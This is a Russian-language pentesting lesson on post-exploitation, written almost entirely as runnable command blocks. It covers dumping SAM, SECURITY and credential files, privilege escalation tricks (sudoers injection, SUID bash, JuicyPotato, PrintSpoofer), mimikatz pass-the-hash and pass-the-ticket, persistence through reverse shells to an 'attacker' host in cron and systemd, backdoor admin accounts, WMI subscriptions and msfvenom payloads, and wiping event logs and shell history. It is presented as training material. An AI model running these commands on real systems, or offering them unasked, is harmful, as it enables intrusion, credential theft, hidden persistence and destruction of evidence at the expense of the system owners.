# Пост-эксплуатация

## Введение в пост-эксплуатацию

Пост-эксплуатация (Post-Exploitation) — это этап пентестинга, который начинается после успешного получения первоначального доступа к системе. На этом этапе пентестер:
- Закрепляется в системе для сохранения доступа
- Повышает привилегии для получения максимальных прав
- Продвигается по сети для достижения целей тестирования
- Собирает ценную информацию
- Документирует все действия и находки

Этот этап критически важен для понимания реального уровня безопасности организации.

## Первоначальный анализ системы

### Linux

```bash
# Информация о системе
uname -a                    # Версия ядра
cat /etc/os-release         # Дистрибутив
hostname                    # Имя хоста
uptime                      # Время работы

# Пользователи и группы
id                          # Текущий пользователь
whoami                      # Имя пользователя
cat /etc/passwd             # Все пользователи
cat /etc/shadow             # Хеши паролей (если есть права)
w                           # Кто сейчас в системе
lastlog                     # Последние входы
last                        # История входов

# Сеть
ip a                        # Интерфейсы
ip route                    # Маршруты
netstat -tulpn              # Слушающие порты
ss -tulpn                   # Современная замена netstat
cat /etc/hosts              # Файл hosts
arp -a                      # ARP таблица

# Процессы
ps aux                      # Все процессы
ps -ef                      # Подробный список
top                         # Мониторинг процессов

# Файловая система
df -h                       # Диски
mount                       # Смонтированные разделы
cat /etc/fstab              # Таблица монтирования

# Cron jobs
cat /etc/crontab            # Системные задания
ls -la /etc/cron.d/         # Директория cron
ls -la /var/spool/cron/     # Пользовательские cron
```

### Windows

```powershell
# Информация о системе
systeminfo                  # Подробная информация
hostname                    # Имя хоста
whoami                      # Текущий пользователь
whoami /priv                # Привилегии
whoami /groups              # Группы

# Сетевая информация
ipconfig /all               # Все интерфейсы
netstat -ano                # Все соединения
route print                 # Таблица маршрутизации
arp -a                      # ARP таблица

# Пользователи
net user                    # Локальные пользователи
net localgroup              # Группы
net localgroup Administrators
query user                  # Кто в системе

# Процессы и службы
tasklist                    # Процессы
tasklist /v                 # Подробно
sc query                    # Службы
Get-Service                 # PowerShell

# Диски
fsutil volume diskfree C:   # Свободное место
mountvol                   # Тома

# Запланированные задачи
schtasks /query /fo LIST
Get-ScheduledTask           # PowerShell
```

## Сбор информации о среде

### Домен Active Directory

```powershell
# Информация о домене
systeminfo | findstr "Domain"
whoami /all                 # Полная информация о пользователе
net config workstation      # Рабочая станция
nltest /dclist:DOMAIN       # Контроллеры домена

# Пользователи домена
net user /domain            # Пользователи домена
net group /domain           # Группы домена
net group "Domain Admins" /domain

# Компьютеры домена
net view /domain
dsquery computer -name * | dsget computer -dn -desc

# Службы
net view /domain /all | findstr "Name:"

# GPO
gpresult /R                 # Применённые политики
gpresult /H report.html /F  # HTML отчёт
```

### Сбор учётных данных

**Linux:**

```bash
# Файлы с паролями
cat /etc/passwd
cat /etc/shadow            # Требуется root

# Конфигурационные файлы
cat /etc/mysql/my.cnf
cat /etc/postgresql/pg_hba.conf
cat /etc/nginx/nginx.conf
cat /etc/ssh/sshd_config

# История команд
cat ~/.bash_history
cat ~/.zsh_history
cat /root/.bash_history

# SSH ключи
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa           # Приватный ключ (если есть)
cat ~/.ssh/known_hosts

# Скрипты и конфиги приложений
find / -name "*.conf" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.env" 2>/dev/null
find / -name "config.php" 2>/dev/null
```

**Windows:**

```powershell
# SAM database (requires SYSTEM)
reg save HKLM\SAM C:\temp\sam
reg save HKLM\SYSTEM C:\temp\system

# LSA Secrets
reg save HKLM\SECURITY C:\temp\security

# Wi-Fi пароли
netsh wlan show profiles
netsh wlan show profile name="WiFiName" key=clear

# Chrome пароли
# PowerShell для извлечения
$path = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
Invoke-Sqlite -Query "SELECT origin_url, username_value, password_value FROM logins"

# Скрытые файлы
dir /a:h                   # Скрытые файлы
dir /a:s                   # Системные файлы

# Recycle Bin
$recycleBin = Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\BitBucket'
```

### Базы данных

```bash
# MySQL/MariaDB
mysql -u root -p
> SHOW DATABASES;
> USE database_name;
> SHOW TABLES;
> SELECT * FROM users;

# PostgreSQL
psql -U postgres -h localhost
> \l
> \dt
> SELECT * FROM users;

# MongoDB
mongo mongodb://localhost:27017
> show dbs
> use database_name
> show collections
> db.users.find()

# Redis
redis-cli -h target
> KEYS *
> GET key_name
> CONFIG GET *
```

## Повышение привилегий

### Linux

**Сбор информации для LPE:**

```bash
# SUID/GUID файлы
find / -perm -4000 -type f 2>/dev/null
find / -perm -2000 -type f 2>/dev/null

# Capabilities
getcap -r /usr/bin 2>/dev/null

# sudo права
sudo -l

# cronjobs с правами root
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.hourly/

# world-writable файлы
find / -type f -perm -o+w 2>/dev/null
find / -type d -perm -o+w 2>/dev/null

# NFS exports (no_root_squash)
cat /etc/exports
showmount -e target

# /etc/passwd writable
ls -la /etc/passwd
```

**Exploit-DB для LPE:**

```bash
searchsploit "Linux Kernel" | grep -i "privilege escalation"
searchsploit "dirty cow"
searchsploit overlayfs

# Проверка эксплойтов под ядро
uname -a
# Linux ubuntu 4.4.0-31-generic #50~14.04.1-Ubuntu
# Ищем эксплойты для этого ядра
```

**Популярные векторы LPE:**

```bash
# Tar wildcard injection
# Если cron запускает tar с wildcard:
echo "echo www-data ALL=(root) NOPASSWD: ALL >> /etc/sudoers" > /tmp/test
echo "" >> /tmp/test
echo "" >> /tmp/test
echo "" >> /tmp/test
tar cf /etc/cron.d/backuper /tmp/test

# PATH manipulation
# Если есть SUID, который вызывает программу без пути:
cp /bin/bash /tmp/sh
chmod +s /tmp/sh
/tmp/sh -p

# Service systemd
# Создание service с exec
cat > /tmp/root.service <<EOF
[Unit]
Description=root

[Service]
Type=oneshot
ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
User=root

[Install]
WantedBy=multi-user.target
EOF
cp /tmp/root.service /etc/systemd/system/root.service
systemctl start root
/tmp/rootbash -p
```

### Windows

**Сбор информации:**

```powershell
# Проверка привилегий
whoami /priv

# Если есть SeImpersonatePrivilege или SeAssignPrimaryTokenPrivilege:
# Juicy Potato / PrintSpoofer

# Если есть SeBackupPrivilege:
# Можно читать любые файлы
icacls C:\Windows\System32\config\SAM

# Слабые сервибы
sc qc service_name
icacls "C:\Path\To\Service"

# Неправильные разрешения реестра
reg query HKLM\System\CurrentControlSet\Services\* /v ObjectName

# AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

# Saved credentials
cmdkey /list
runas /savecred /user:admin cmd.exe

# PowerShell history
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

**Juicy Potato (до Windows 10 1809):**

```powershell
# Проверка
whoami /priv | findstr SeImpersonate

# Использование
JuicyPotato.exe -l 4444 -p C:\Windows\System32\cmd.exe -t *
JuicyPotato.exe -l 4444 -p C:\Windows\System32\cmd.exe -t * -c {CLSID}
```

**PrintSpoofer (Windows 10 1809+):**

```powershell
PrintSpoofer.exe -c "C:\Windows\System32\cmd.exe"
PrintSpoofer.exe -c "C:\Windows\System32\powershell.exe"
```

**DLL Hijacking:**

```powershell
# Найти программу, которая ищет DLL в текущей директории
# Создать вредоносную DLL
msfvenom -p windows/meterpreter/reverse_tcp LHOST=attacker LPORT=4444 -f dll > malicious.dll
# Запустить программу из директории с DLL
```

## Продвижение по сети

### Горизонтальное перемещение

**SSH:**

```bash
# Туннели
ssh -L 8080:localhost:80 user@target
ssh -R 8080:localhost:80 user@attacker
ssh -D 1080 user@target  # SOCKS прокси

# Проброс портов через несколько хостов
ssh -J user1@host1 user2@host2

# Динамический проброс для Metasploit
ssh -D 1080 user@target
# Настроить socks4a прокси в Metasploit
```

**SMB/Psexec:**

```bash
# psexec из Impacket
psexec.py domain/user@target
psexec.py domain/admin@target

# smbexec
smbexec.py domain/user@target

# wmiexec
wmiexec.py domain/user@target

# atexec (выполнение через schtasks)
atexec.py domain/user@target "whoami"
```

**PowerShell Remoting:**

```powershell
# Подключение
Enter-PSSession -ComputerName target -Credential domain\user

# Выполнение команды
Invoke-Command -ComputerName target -ScriptBlock { whoami }

# Скрипт для продвижения
$session = New-PSSession -ComputerName target
Invoke-Command -Session $session -ScriptBlock {
    # Код для выполнения
}
```

### Вертикальное перемещение

**Pass-the-Hash:**

```bash
# Impacket
psexec.py -hashes :ntlm_hash domain/user@target

# Metasploit
set SMBPass :ntlm_hash
set SMBUser user

# CrackMapExec
crackmapexec smb target -u user -H ntlm_hash
```

**Pass-the-Ticket (Kerberos):**

```bash
# Извлечение тикета
mimikatz # sekurlsa::tickets /export

# Использование тикета
mimikatz # kerberos::ptt ticket.kirbi

# Запрос тикета с помощью kinit
kinit user@DOMAIN
klist
```

**Over-pass-the-hash:**

```bash
# Использование NTLM hash для получения Kerberos ticket
mimikatz # sekurlsa::pth /user:admin /domain:domain /ntlm:ntlm_hash /run:cmd
```

## Закрепление доступа (Persistence)

### Linux

```bash
# SSH ключи для постоянного доступа
mkdir ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys

# Cron для обратного соединения
echo "*/5 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1'" >> /etc/cron.d/backup

# systemd service
cat > /etc/systemd/system/malware.service <<EOF
[Unit]
Description=System Update Service

[Service]
Type=simple
ExecStart=/bin/bash -c '/bin/bash -i >& /dev/tcp/attacker/4444 0>&1'
User=root

[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload
systemctl enable malware
systemctl start malware

# rootkit (для демонстрации - в реальном тесте может быть избыточно)
# Скрытие процессов, файлов, соединений
```

### Windows

```powershell
# Создание пользователя
net user backdoor Pass123! /add
net localgroup Administrators backdoor /add

# Реестр для автозапуска
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\temp\malware.exe"

# Планированная задача
schtasks /create /tn "Windows Update" /tr "C:\temp\malware.exe" /sc hourly /ru SYSTEM

# WMI Event Subscription (сложно обнаружить)
$filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments @{Name="test";EventNamespace="root\subscription";QueryLanguage="WQL";Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}

$consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="test";CommandLineTemplate="C:\temp\malware.exe"}

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$filter;Consumer=$consumer}

# Служба
sc create "Update Service" binPath= "C:\temp\malware.exe" start= auto
sc description "Update Service" "Windows Update Service"
sc start "Update Service"

# Обратный шелл через HTTPS (сложнее обнаружить)
# Использовать msfvenom с staged payload
msfvenom -p windows/meterpreter_reverse_https LHOST=attacker LPORT=4444 -f exe -o malware.exe
```

## Сбор данных

### Файлы для сбора

```bash
# Linux
find / -name "*.txt" 2>/dev/null | xargs grep -l "password" 2>/dev/null
find / -name "*.kdbx" 2>/dev/null  # KeePass
find / -name "*.psafe3" 2>/dev/null  # Password Safe
find / -name "*.csv" 2>/dev/null | xargs grep -l "password" 2>/dev/null

# Windows
dir /s /b C:\*.txt | findstr /i password
dir /s /b C:\*.xml | findstr /i password
dir /s /b C:\*.cfg | findstr /i password
dir /s /b C:\*.conf | findstr /i password
dir /s /b C:\*.ini | findstr /i password

# Базы данных
mysqldump -u root -p database > database.sql
pg_dump -U postgres database > database.sql
```

### Экспорт данных из Active Directory

```powershell
# PowerView
Import-Module .\PowerView.ps1
Get-DomainUser | Export-Csv users.csv
Get-DomainComputer | Export-Csv computers.csv
Get-DomainGroup | Export-Csv groups.csv
Get-DomainOU | Export-Csv ous.csv
Get-DomainGPO | Export-Csv gpos.csv

# BloodHound
.\SharpHound.exe -c All
# Загрузить данные в BloodHound для анализа

# AD module
Get-ADUser -Filter * | Export-Csv users.csv
Get-ADComputer -Filter * | Export-Csv computers.csv
Get-ADGroup -Filter * | Export-Csv groups.csv
```

## Очистка следов

### Linux

```bash
# Очистка истории bash
history -c
rm ~/.bash_history
unset HISTFILE

# Очистка логов
# Внимание: очистка логов может быть сама по себе подозрительной
# Лучше удалять только конкретные записи

# Временные файлы
rm -f /tmp/*
rm -f /var/tmp/*

# Удаление эксплойтов
rm -f /tmp/exploit.c
rm -f /tmp/exploit
```

### Windows

```powershell
# Очистка Event Logs
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
# Внимание: очистка логов подозрительна!

# Удаление временных файлов
Remove-Item -Path "C:\Windows\Temp\*" -Recurse -Force
Remove-Item -Path "$env:TEMP\*" -Recurse -Force

# Очистка PowerShell history
Remove-Item (Get-PSReadLineOption).HistorySavePath

# Удаление артефактов
Remove-Item C:\temp\sam
Remove-Item C:\temp\system
Remove-Item C:\temp\security
```

## Практический пример

**Сценарий:** Продвижение от веб-шелла до доменного администратора

```
Шаг 1: Первоначальный доступ
- Получен веб-шел на web-server через LFI
- Пользователь: www-data

Шаг 2: Сбор информации
- uname: Linux web-server 4.15
- id: uid=33(www-data) gid=33(www-data) groups=33(www-data)
- sudo -l: (ALL) NOPASSWD: /usr/bin/apt-get

Шаг 3: Повышение привилегий
- sudo apt-get update -o APT::Update::Pre-Invoke::="/bin/sh"
- Получен root!

Шаг 4: Сбор учётных данных
- /etc/shadow доступен (с правами root)
- Сохранены хеши пользователей
- Найден SSH ключ в /home/webadmin/.ssh/

Шаг 5: Продвижение по сети
- SSH ключ подключается к db-server
- На db-server: найдены строки подключения в конфигах
- Использованы учётные данные для SQL сервера

Шаг 6: Доступ к Active Directory
- Из SQL сервера: linked server к domain-controller
- Получен доступ к данным AD
- Найдены учётные записи service account с привилегиями

Шаг 7: Получение DA
- Использованы привилегии для подключения к DC
- Загружен Mimikatz
- Получены хеши администраторов домена
- Pass-the-Hash -> Domain Admin!

Шаг 8: Закрепление
- Добавлен пользователь в группу Domain Admins
- Создана запланированная задача на DC
- Собран BloodHound данные
```

## Выводы

Пост-эксплуатация — это наиболее продолжительный и технически сложный этап пентестинга. Он требует глубокого понимания операционных систем, сетей и протоколов аутентификации. Помните о целях тестирования: вы должны продемонстрировать реальный уровень риска, не нанося ущерба системам. Всегда документируйте действия и очищайте следы после завершения теста.

---

**Следующий урок:** Отчётность и документация — как правильно оформлять результаты пентестинга.

